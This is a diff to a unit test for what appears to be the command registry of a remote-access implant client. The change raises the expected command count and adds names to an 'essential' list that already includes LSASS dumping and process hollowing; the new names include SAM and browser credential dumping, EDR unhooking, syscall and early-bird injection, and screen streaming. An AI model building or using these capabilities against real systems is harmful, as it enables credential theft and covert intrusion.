@@ -94,10 +94,12 @@ class TestCommandRegistry(unittest.TestCase):
         from client.commands import build_client_registry
         registry = build_client_registry()
         commands = set(registry._key_map.keys())
-        self.assertGreater(len(commands), 45)
+        self.assertGreater(len(commands), 55)
         essential = ['ls', 'cd', 'pwd', 'rm', 'download', 'upload', 'sysinfo',
                      'ps', 'kill', 'grep', 'persistence', 'background', 'help',
-                     'whoami', 'inject', 'hollow', 'migrate', 'lsass_dump', 'socks5']
+                     'whoami', 'inject', 'hollow', 'migrate', 'lsass_dump', 'socks5',
+                     'unhook', 'syscall_inject', 'early_bird', 'pty', 'stream_start',
+                     'sam_dump', 'browser_dump']
         for cmd in essential:
             self.assertIn(cmd, commands, f'Missing essential command: {cmd}')
 
